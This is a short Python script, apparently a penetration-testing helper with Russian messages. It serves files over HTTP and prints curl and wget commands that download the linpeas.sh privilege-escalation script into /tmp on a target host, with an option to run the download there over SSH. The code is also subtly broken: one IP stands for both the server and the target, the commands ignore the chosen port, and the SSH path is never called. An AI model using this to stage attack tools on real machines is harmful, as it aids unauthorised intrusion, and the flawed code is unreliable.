import http.server
import socketserver
import threading
import subprocess
import time

def start_http_server(port=8080):
    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port), handler)
    print(f"[+] HTTP сервер запущен на порту {port}")
    httpd.serve_forever()

def run_upload_commands(ip, use_ssh=False, ssh_user=None):
    curl_cmd = f"curl http://{ip}:8080/linpeas.sh -o /tmp/linpeas.sh"
    wget_cmd = f"wget http://{ip}:8080/linpeas.sh -O /tmp/linpeas.sh"

    print("\n[+] Команды для скачивания файла на целевой машине:")
    print(f"curl: {curl_cmd}")
    print(f"wget: {wget_cmd}")

    if use_ssh and ssh_user:
        # Выполняем команду curl по ssh на целевой машине
        ssh_curl = f"ssh {ssh_user}@{ip} '{curl_cmd}'"
        print(f"\n[+] Выполняем curl по SSH: {ssh_curl}")
        subprocess.run(ssh_curl, shell=True)

def full_upload_stack(ip, port):
    server_thread = threading.Thread(target=start_http_server, args=(int(port),), daemon=True)
    server_thread.start()

    time.sleep(1) 

    run_upload_commands(ip, use_ssh=False)

    print("\n[+] HTTP сервер работает. Для остановки нажмите Ctrl+C.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[+] HTTP сервер остановлен.")
